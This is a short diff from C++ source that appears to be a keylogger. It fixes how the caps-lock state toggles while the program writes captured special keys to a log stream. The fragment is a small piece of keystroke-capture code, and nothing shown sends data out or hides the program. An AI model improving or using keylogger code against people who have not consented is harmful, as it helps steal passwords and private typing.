@@ -94,7 +94,7 @@ int main(){
 
                 if(spcl_key_map[vkey] != ""){ // handles special keys
 
-                    if(vkey == 20) { caps_lock = (true) ? true : false; } // switch for caps lock key
+                    if(vkey == 20) { caps_lock = !caps_lock; } // switch for caps lock key
 
                     keylog << spcl_key_map[vkey];
                     keylog.flush();
